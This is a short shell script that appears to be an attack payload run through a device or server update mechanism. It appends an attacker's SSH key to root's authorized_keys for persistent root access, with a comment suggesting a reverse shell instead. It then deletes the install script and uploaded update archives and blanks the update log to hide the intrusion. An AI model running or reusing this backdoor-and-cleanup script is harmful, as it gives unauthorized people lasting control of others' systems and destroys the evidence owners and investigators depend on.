#!/bin/sh
# add your ssh key or rev shell
# bch8
echo -n 'ecdsa-sha2-nistp384 AAAAE2...' >> /root/.ssh/authorized_keys

# cleanup
rm -f /tmp/version
rm -f /var/www/hiawatha/upload/update*.tar.gz
rm -f /tmp/install.sh
echo -n > /var/log/update.log
sync
